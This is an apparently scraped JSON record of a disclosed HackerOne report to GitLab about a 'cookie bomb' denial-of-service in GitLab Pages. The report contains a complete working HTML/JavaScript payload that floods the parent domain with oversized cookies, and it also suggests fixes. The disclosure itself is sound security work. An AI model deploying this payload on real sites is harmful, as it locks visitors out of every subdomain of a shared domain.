{
  "id": 221041,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjEwNDE=",
  "url": "https://hackerone.com/reports/221041",
  "title": "Cookie bomb",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-04-14T18:21:19.323Z",
  "submitted_at": "2017-04-14T18:21:19.323Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "moritz30",
    "url": "/moritz30",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-02-16T22:25:29.045Z",
  "bug_reporter_agreed_on_going_public_at": "2018-02-16T20:01:34.378Z",
  "team_member_agreed_on_going_public_at": "2018-02-16T22:25:28.906Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "It is possible to create a that called cookie bomb in Gitlab Pages. This is especially a problem if the site creating the cookie bomb uses a shared pages domain. In that case no (sub)domain of that domain would be accessible for that user anymore until they clear their cookies. That does not only include GitLab (Pages) (sub)domains. The code of my sample page is\n\n`<html>\n<head>\n</head>\n<body>\n<script>\nvar base_domain = document.domain.substr(document.domain.indexOf('.'));\nvar pollution = Array(4000).join('a');\nfor(var i=1;i<99;i++){\n    document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain;\n}\n</script>\n<h1>Cookie Bomb executed! To remove it clear your cookies.</h1>\n</body>\n</html>`\n\nThe cookie bomb works by using JavaScript to set cookies that are way too big making the server decline any request send with them for having a too long request header.\n\nIt should also work on Gitlab.com.\n\nMore information about cookie bombs can be found at http://homakov.blogspot.de/2014/01/cookie-bomb-or-lets-break-internet.html .\n\nA solution would be to inject JS into every page served using Gitlab pages that uses the cookies.change event and checks if there are a lot of cookies being set and then removing them. An other solution would be to check the HTML of Gitlab pages before deploying them.\n\nTest sites:\nJust a demo page that does nothing special (to see that it works before but not after executing the cookie bomb): http://test1.thedragonteam.info\nA page that executes a cookie bomb: http://test2.thedragonteam.info\nBoth are served using Gitlab pages.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-03-18T20:01:34.530Z",
  "allow_singular_disclosure_after": -186424660.74573994,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "shubham_srt",
    "elmahdi",
    "eveeez",
    "guruprasadmullangi",
    "japz",
    "nafisaqil"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
